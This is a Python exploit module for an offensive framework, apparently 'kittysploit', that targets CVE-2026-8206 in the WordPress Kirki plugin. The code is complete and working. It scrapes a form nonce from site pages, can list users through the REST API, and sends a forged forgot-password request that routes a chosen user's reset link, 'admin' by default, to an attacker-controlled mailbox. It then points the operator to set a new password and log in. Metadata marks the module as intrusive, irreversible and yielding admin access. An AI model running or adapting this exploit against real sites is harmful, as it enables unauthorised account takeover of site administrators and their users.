#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-8206 — Kirki password-reset email redirect (account takeover)."""

import json
import re
from typing import List, Optional, Tuple
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Kirki CVE-2026-8206 password-reset takeover",
        "description": (
            "CVE-2026-8206: Kirki 6.0.0–6.0.6 CompLibFormHandler accepts an arbitrary "
            "email when resetting by username. POSTs to "
            "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password with "
            "X-WP-Element-Nonce, redirecting the victim's reset link to attacker_email. "
            "Does not complete the password change (requires mailbox access). Fixed in 6.0.7."
        ),
        "author": ["Wordfence", "KittySploit Team"],
        "cve": ["CVE-2026-8206"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-8206",
            "https://orca.security/resources/blog/kirki-wordpress-plugin-vulnerability-cve-2026-8206/",
            "https://github.com/rootdirective-sec/CVE-2026-8206-Lab",
            "https://wordpress.org/plugins/kirki/",
        ],
        "tags": [
            "wordpress",
            "kirki",
            "account-takeover",
            "privilege-escalation",
            "unauthenticated",
            "password-reset",
            "cve-2026-8206",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "account_creation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "cost": 1.4,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["wordpress", "kirki"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [
                    "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
                ],
                "param_any": ["username", "email"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "wordpress"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _ENDPOINT = "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password"
    _NONCE_RES = (
        re.compile(
            r'KirkiComponentLibrary[^}]{0,800}?"nonce"\s*:\s*"([a-f0-9]+)"',
            re.I | re.DOTALL,
        ),
        re.compile(r'"element_nonce"\s*:\s*"([a-f0-9]+)"', re.I),
        re.compile(r'"nonce"\s*:\s*"([a-f0-9]+)"', re.I),
    )

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("admin", "Target WordPress username", required=False)
    attacker_email = OptString(
        "",
        "Attacker-controlled email that should receive the reset link",
        required=True,
    )
    page_path = OptString(
        "/",
        "Page embedding Kirki forms (nonce source)",
        required=False,
    )
    enumerate_users = OptBool(
        False,
        "List users via /wp-json/wp/v2/users before exploit",
        required=False,
    )
    use_rest_route = OptBool(
        False,
        "Use /?rest_route=/KirkiComponentLibrary/v1/kirki-forgot-password",
        required=False,
        advanced=True,
    )

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _base(self) -> str:
        return self.wp_normalize_base_path(self._opt(self.path) or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        if root == "/":
            return suffix
        return root.rstrip("/") + suffix

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _endpoint(self) -> str:
        if self.use_rest_route:
            route = quote("/KirkiComponentLibrary/v1/kirki-forgot-password", safe="")
            # rest_route is a query on site root
            root = self._base()
            if root == "/":
                return f"/?rest_route={route}"
            return f"{root}/?rest_route={route}"
        return self._join(self._ENDPOINT)

    def _extract_nonce(self, html: str) -> Optional[str]:
        text = html or ""
        # Prefer Kirki-scoped nonce
        for pattern in self._NONCE_RES:
            match = pattern.search(text)
            if match:
                return match.group(1)
        return None

    def _harvest_nonce(self) -> Tuple[Optional[str], str]:
        candidates = []
        forced = self._opt(self.page_path) or "/"
        candidates.append(forced)
        for extra in (
            "/",
            "/login/",
            "/register/",
            "/forgot-password/",
            "/password-reset/",
            "/account/",
            "/wp-login.php",
        ):
            if extra not in candidates:
                candidates.append(extra)

        for path in candidates:
            response = self.http_request(
                method="GET",
                path=self._join(path),
                allow_redirects=True,
                timeout=self._timeout(),
            )
            if not response or response.status_code != 200:
                continue
            nonce = self._extract_nonce(response.text or "")
            if nonce and (
                "kirki" in (response.text or "").lower()
                or path != "/"
                or "KirkiComponentLibrary" in (response.text or "")
            ):
                return nonce, path
            if nonce and "KirkiComponentLibrary" in (response.text or ""):
                return nonce, path
        # Second pass: any nonce if Kirki markers present
        for path in candidates:
            response = self.http_request(
                method="GET",
                path=self._join(path),
                allow_redirects=True,
                timeout=self._timeout(),
            )
            if not response:
                continue
            text = response.text or ""
            if "KirkiComponentLibrary" not in text and "kirki" not in text.lower():
                continue
            nonce = self._extract_nonce(text)
            if nonce:
                return nonce, path
        return None, ""

    def _list_users(self) -> List[str]:
        users = []
        response = self.http_request(
            method="GET",
            path=self._join("/wp-json/wp/v2/users"),
            allow_redirects=True,
            timeout=self._timeout(),
        )
        if response and response.status_code == 200:
            try:
                data = response.json()
            except Exception:
                data = []
            if isinstance(data, list):
                for row in data:
                    if isinstance(row, dict):
                        slug = row.get("slug") or row.get("name")
                        if slug:
                            users.append(str(slug))
        return users

    def _forgot(self, nonce: str, username: str, email: str):
        email_body = json.dumps(
            [
                {"type": "chip", "value": "reset_link"},
                {
                    "type": "text",
                    "value": "Click the link above to reset your password.",
                },
            ]
        )
        return self.http_request(
            method="POST",
            path=self._endpoint(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-WP-Element-Nonce": nonce,
            },
            data={
                "username": username,
                "email": email,
                "emailSubject": "Password Reset Request",
                "emailBody": email_body,
            },
            allow_redirects=False,
            timeout=self._timeout(),
        )

    def _looks_success(self, response) -> Tuple[bool, str]:
        if not response:
            return False, "no response"
        body = response.text or ""
        code = response.status_code
        try:
            data = response.json() if body else {}
        except Exception:
            data = {}

        if code == 200:
            if isinstance(data, dict):
                if data.get("error") or data.get("code") in (
                    "rest_forbidden",
                    "rest_cookie_invalid_nonce",
                    "kirki_invalid_nonce",
                ):
                    return False, str(data.get("message") or data.get("code") or data)
                if data.get("success") is True or data.get("message"):
                    return True, str(data.get("message") or "success")
            if "error" not in body.lower()[:200]:
                return True, f"HTTP 200 ({len(body)}b)"
        if code in (401, 403):
            return False, f"HTTP {code} (nonce/auth rejected — may be patched or wrong nonce)"
        return False, f"HTTP {code}"

    def check(self):
        nonce, page = self._harvest_nonce()
        if not nonce:
            return {
                "vulnerable": False,
                "reason": "Kirki element nonce not found",
                "confidence": "low",
            }
        return {
            "vulnerable": True,
            "reason": f"Nonce harvested from {page}; active POST required to confirm",
            "confidence": "medium",
            "nonce": nonce[:8] + "…",
        }

    def run(self):
        email = self._opt(self.attacker_email)
        if not email or "@" not in email:
            print_error("Set attacker_email to a mailbox you control")
            return False

        print_status("CVE-2026-8206 Kirki password-reset email redirect")

        if self.enumerate_users:
            users = self._list_users()
            if users:
                print_success(f"REST users ({len(users)}): {', '.join(users[:20])}")
            else:
                print_info("No users from /wp-json/wp/v2/users")

        print_status("Harvesting X-WP-Element-Nonce…")
        nonce, page = self._harvest_nonce()
        if not nonce:
            print_error(
                "Nonce not found — set page_path to a page with Kirki login/forgot form"
            )
            return False
        print_success(f"Nonce from {page}: {nonce[:12]}…")

        username = self._opt(self.username) or "admin"
        print_status(f"Redirecting reset for '{username}' → {email}")
        response = self._forgot(nonce, username, email)
        ok, reason = self._looks_success(response)
        print_info(reason)
        if response and response.text:
            sample = re.sub(r"\s+", " ", response.text)[:220]
            print_info(sample)

        if ok:
            print_warning("Reset request accepted — check attacker mailbox for the link")
            print_info(f"Next: open reset link → set password → login as {username}")
            print_info(f"wp-login: {self._join('/wp-login.php')}")
            return True

        print_error("Exploit did not succeed (patched 6.0.7+, wrong nonce, or user missing)")
        return False
